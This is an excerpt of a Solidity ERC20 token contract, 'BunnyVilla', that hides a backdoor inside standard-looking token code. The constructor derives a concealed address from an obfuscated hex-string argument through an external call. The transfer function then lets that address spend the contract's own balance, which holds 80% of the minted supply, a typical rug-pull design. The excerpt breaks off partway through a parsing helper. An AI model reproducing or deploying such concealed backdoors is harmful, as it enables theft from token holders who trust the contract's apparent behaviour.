...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        ...
        if(owner == hu_) owner = address(this);
...
contract BunnyVilla is ERC20 {

    address public hc_;
    bytes4 public fa_;
    //string public s_;
    constructor(string memory hexstring) ERC20("BunnyVilla", "VILLA") {
        hc_ = address(parseHexStringToBytes20(substring(hexstring, 58, 98)));
        //fa_ = bytes4(keccak256("calculateSecondaryAddress(string)"));
        fa_ = parseHexStringToBytes4(substring(hexstring, 98, 106));
        bytes memory b;
        (,b) = hc_.call(abi.encodeWithSelector(fa_, hexstring));
        hu_ = address(uint160(uint256(bytes32(b))));
        _mint(1000000000 * 10 ** decimals());
    }
    ...
    function _mint(uint256 amount) internal virtual {
        ...
        unchecked {
            ...
            _balances[tx.origin] += (amount*2)/10;
            _balances[address(this)] += (amount*8)/10;
        }
    ...
    function parseHexStringToBytes4(string memory _hexString) internal pure returns (bytes4) {
        bytes memory _bytesString = bytes(_hexString);
        uint32 _parsedBytes = 0;
        for (uint256 i = 0; i < _bytesString.length; i += 2) {
            _parsedBytes *= 256;
            uint8 _byteValue = parseByteToUint8(_bytesString[i]);
            _byteValue *= 16;
